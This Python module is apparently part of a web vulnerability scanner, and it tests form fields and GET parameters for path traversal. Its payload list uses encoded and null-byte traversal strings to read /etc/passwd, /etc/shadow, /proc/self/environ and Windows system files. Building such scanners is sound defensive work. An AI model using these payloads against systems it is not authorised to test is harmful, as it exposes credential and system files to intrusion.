from __future__ import annotations
"""
scanner/testers/path_traversal.py
------------------------------------
Path / Directory Traversal vulnerability tester.

Path traversal lets attackers read files outside the web root by injecting
sequences like ../../../../etc/passwd into file-path parameters.

Detection: inject traversal sequences and verify the response contains
OS-specific file content markers (confirms actual file read, not just
a reflected error — eliminates false positives).

Encoding variants tested:
  - Plain                   ../../../../etc/passwd
  - URL-encoded             ..%2F..%2F..%2Fetc%2Fpasswd
  - Double URL-encoded      ..%252F..%252Fetc%252Fpasswd
  - Null byte truncation    ../../../../etc/passwd%00
  - Double dot-slash        ....//....//etc/passwd
  - Absolute path           /etc/passwd
  - Windows backslash       ..\\..\\..\\windows\\win.ini
  - URL-encoded backslash   ..%5C..%5Cwindows%5Cwin.ini

OWASP ref: A01:2021 Broken Access Control, CWE-22
"""

import logging

from scanner.crawler import CrawledForm, CrawledPage
from scanner.reporting.models import Finding, Severity, VulnType
from scanner.testers.base import BaseTester
from scanner.utils import http as http_utils

logger = logging.getLogger(__name__)

_REMEDIATION = (
    "Validate and sanitize all file path inputs. Resolve the canonical path with "
    "os.path.realpath() and verify it starts within your intended base directory. "
    "Never pass unsanitized user input to file open / read / include operations. "
    "Ref: OWASP Path Traversal Cheat Sheet."
)

# (payload, text_that_must_appear_in_response_to_confirm)
_PAYLOADS: list[tuple[str, str]] = [
    # Unix — etc/passwd
    ("../../../../etc/passwd",               "root:"),
    ("../../../etc/passwd",                  "root:"),
    ("../../../../etc/passwd%00",            "root:"),
    ("..%2F..%2F..%2F..%2Fetc%2Fpasswd",    "root:"),
    ("..%252F..%252F..%252Fetc%252Fpasswd",  "root:"),
    ("....//....//....//....//etc/passwd",   "root:"),
    ("/etc/passwd",                          "root:"),
    # Unix — /etc/shadow (extra evidence of RCE potential)
    ("../../../../etc/shadow",               "root:"),
    # Unix — /proc/self/environ
    ("../../../../proc/self/environ",        "HTTP_"),
    # Windows — win.ini
    ("../../../../windows/win.ini",          "[extensions]"),
    ("../../../../windows/win.ini",          "[fonts]"),
    ("..\\..\\..\\..\\windows\\win.ini",     "[extensions]"),
    ("..%5C..%5C..%5C..%5Cwindows%5Cwin.ini", "[extensions]"),
    # Windows — boot.ini (older systems)
    ("../../../../boot.ini",                 "[boot loader]"),
    # Windows — system32 hosts file
    ("../../../../windows/system32/drivers/etc/hosts", "localhost"),
]


class PathTraversalTester(BaseTester):
    """Tests for path traversal vulnerabilities in form fields and GET parameters."""

    def __init__(self) -> None:
        super().__init__(name="Path Traversal Tester")

    def run(self, pages: list[CrawledPage]) -> list[Finding]:
        self.findings.clear()
        self._params_tested = 0

        for page in pages:
            for form in page.forms:
                for field in form.testable_fields:
                    self._test_form(form, field.name)
            for param in page.get_params:
                self._test_get(page.url, param)

        return self.findings

    def _test_form(self, form: CrawledForm, field_name: str) -> None:
        self._count_test()

        # Fetch baseline to avoid flagging markers already present in normal responses
        try:
            baseline_data = self._inject_form(form, field_name, "baseline_traversal_test")
            if form.method == "POST":
                baseline_resp = http_utils.post(form.action_url, data=baseline_data)
            else:
                baseline_resp = http_utils.get(form.action_url, params=baseline_data)
            baseline_text = baseline_resp.text
        except Exception:
            baseline_text = ""

        for payload, confirm in _PAYLOADS:
            data = self._inject_form(form, field_name, payload)
            try:
                if form.method == "POST":
                    resp = http_utils.post(form.action_url, data=data)
                else:
                    resp = http_utils.get(form.action_url, params=data)
            except Exception:
                continue

            if confirm in resp.text:
                # Skip if the same marker already appears in the baseline
                if baseline_text and confirm in baseline_text:
                    continue
                self._log_finding(Finding(
                    vuln_type=VulnType.PATH_TRAVERSAL,
                    severity=Severity.HIGH,
                    url=form.action_url,
                    parameter=field_name,
                    method=form.method,
                    payload=payload,
                    evidence=f"Traversal confirmed: '{confirm}' found in response",
                    remediation=_REMEDIATION,
                    extra={"os_indicator": confirm},
                ))
                return  # one confirmed hit per field is enough

    def _test_get(self, url: str, param_name: str) -> None:
        self._count_test()

        # Fetch baseline to avoid flagging markers already present in normal responses
        try:
            baseline_url = self._inject_get_param(url, param_name, "baseline_traversal_test")
            baseline_resp = http_utils.get(baseline_url)
            baseline_text = baseline_resp.text
        except Exception:
            baseline_text = ""

        for payload, confirm in _PAYLOADS:
            injected = self._inject_get_param(url, param_name, payload)
            try:
                resp = http_utils.get(injected)
            except Exception:
                continue

            if confirm in resp.text:
                # Skip if the same marker already appears in the baseline
                if baseline_text and confirm in baseline_text:
                    continue
                self._log_finding(Finding(
                    vuln_type=VulnType.PATH_TRAVERSAL,
                    severity=Severity.HIGH,
                    url=injected,
                    parameter=param_name,
                    method="GET",
                    payload=payload,
                    evidence=f"Traversal confirmed: '{confirm}' found in response",
                    remediation=_REMEDIATION,
                    extra={"os_indicator": confirm},
                ))
                return
